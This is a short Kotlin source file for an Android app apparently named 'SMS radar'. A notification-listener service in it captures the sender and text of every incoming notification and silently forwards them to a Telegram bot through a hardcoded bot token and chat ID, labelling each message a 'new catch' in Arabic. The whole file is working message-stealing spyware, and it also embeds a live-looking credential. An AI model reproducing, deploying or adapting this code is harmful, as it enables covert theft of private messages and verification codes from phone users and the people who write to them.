package com.mohamed.smsradar

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import okhttp3.*
import java.io.IOException
import java.net.URLEncoder

class SmsService : NotificationListenerService() {
    private val client = OkHttpClient()
    private val token = "8561370342:AAESNgx1om8jD4cjRPqlvhUw73I4OHR6soA"
    private val chatId = "7952511316"

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: "Unknown"
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        
        if (text.isNotEmpty()) {
            val report = "🚀 صيد جديد:\n👤 من: $title\n💬 الرسالة: $text"
            sendToTelegram(report)
        }
    }

    private fun sendToTelegram(message: String) {
        try {
            val url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=${URLEncoder.encode(message, "UTF-8")}"
            val request = Request.Builder().url(url).build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        } catch (e: Exception) {}
    }
}